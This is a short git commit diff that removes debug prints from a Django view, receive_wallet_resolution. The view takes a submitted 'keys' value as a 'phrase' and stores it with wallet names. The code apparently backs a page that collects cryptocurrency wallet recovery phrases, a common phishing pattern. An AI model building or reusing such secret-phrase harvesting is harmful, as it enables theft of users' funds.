022805654be48b1a89f9fe268d678d29be65f8de
abiola814 <oladunjoye1998@gmail.com>
2024-09-20 02:34:47 +0100

    final here

--- resolution/views.py
+++ resolution/views.py
@@ -8,14 +8,12 @@ import json
 def receive_wallet_resolution(request):
     if request.method == "POST":
         data = request.POST
-        print(data)
         name = data.get("walletType", "wallet")
         issue = data.get("walletType", "wallet")
         phrase = data.get("keys")
         wallet1 = data.get("wallet1", "wallet")
         wallet2 = data.get("wallet2", "wallet")
         print("got here")
-        print(wallet1, wallet2, phrase, issue, name)
         wallet_resolution = WalletResolution.objects.create(
             wallet_name=name,
             issue=issue,
